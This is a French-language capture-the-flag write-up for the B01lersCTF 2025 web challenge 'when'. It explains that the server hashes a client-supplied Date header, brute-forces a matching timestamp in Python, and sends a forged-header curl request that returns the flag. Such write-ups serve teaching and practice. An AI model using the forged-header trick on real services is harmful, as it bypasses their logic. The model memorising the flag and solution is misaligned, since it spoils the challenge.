---
title: "B01lersCTF 2025 : When | Web"
date: 2025-04-22
draft: false
categories: ["Web"]
ctf: "B01lersCTF 2025"
challenge: "When"
author: "Reyko"
---

# Challenge : **when**

## Énoncé

> the sunk cost fallacy

`https://when.atreides.b01lersc.tf/`

## 1. Analyse : 

Le backend Express gère :

- **GET** : sert le contenu statique (HTML/CSS/JS/​assets) sans limiter.

- **POST** `/gamble` : l’unique endpoint soumis au rate‑limit (60 requêtes/minute).

```ts
// Calcul du nombre "number" (timestamp en secondes)
const time   = req.headers.date ? new Date(req.headers.date) : new Date();
const number = Math.floor(time.getTime() / 1000);

// Hachage SHA-256 de number.toString()
async function gamble(number: number) {
    return crypto.subtle.digest("SHA-256", Buffer.from(number.toString()));
}

gamble(number).then(data => {
    const bytes = new Uint8Array(data);
    // Si les deux premiers octets sont 0xFF, on renvoie le flag
    if (bytes[0] == 0xFF && bytes[1] == 0xFF) {
        res.send({ success: true,
                   result: "1111111111111111",
                   flag: "bctf{…}" });
    } else {
        // sinon, on renvoie juste les 16 premiers bits en binaire
        const bits16 = bytes[0].toString(2).padStart(8,'0')
                     + bytes[1].toString(2).padStart(8,'0');
        res.send({ success: true, result: bits16 });
    }
});
```

## 2. Observations : 

 Sunk cost fallacy : on pourrait croire qu’il faut spammer des requêtes jusqu’à « tomber » sur le flag, mais…

Le service ne dépend pas de vos tentatives précédentes : chaque appel `/gamble` est indépendant et ne stocke aucun état de session.

Le flag n’apparaît jamais de manière aléatoire : il est renvoyé uniquement le jour où le SHA‑256 du timestamp (en secondes) commence par deux octets à `0xFF`.

## 3. Brute‑force hors‑ligne : 

1. But : trouver un entier NN tel que :
`h SHA256(str(N))[0] == 0xFF && SHA256(str(N))[1] == 0xFF`

2. find_n.py :

```python
#!/usr/bin/env python3
import hashlib

def find_number(limit=200_000):
 for n in range(limit):
     h = hashlib.sha256(str(n).encode()).digest()
     if h[0] == 0xFF and h[1] == 0xFF:
         return n
 raise RuntimeError("Aucun N trouvé, augmentez la limite")

if __name__ == "__main__":
 N = find_number()
 print("Found N =", N)
````

```console
$ python3 find_n.py
Found N = 30398
```

## 4. Solve : 

1. Générer l’en‑tête `Date` correspondant à NN :

    ```bash
    DATE=$(python3 - <<EOF
    import datetime
    print(
      datetime.datetime.utcfromtimestamp(30398)
      .strftime('%a, %d %b %Y %H:%M:%S GMT')
    )
    EOF
    )
    ```

2. **Faire une seule requête** avec ce header :

    ```bash
    curl -s \
      -H "Date: $DATE" \
      -X POST https://when.atreides.b01lersc.tf/gamble | jq
    ```

3. **Réponse** :

```json
{
  "success": true,
  "result": "1111111111111111",
  "flag": "bctf{ninety_nine_percent_of_gamblers_gamble_81dc9bdb}"
}
```

Flag : 

`bctf{ninety_nine_percent_of_gamblers_gamble_81dc9bdb}`
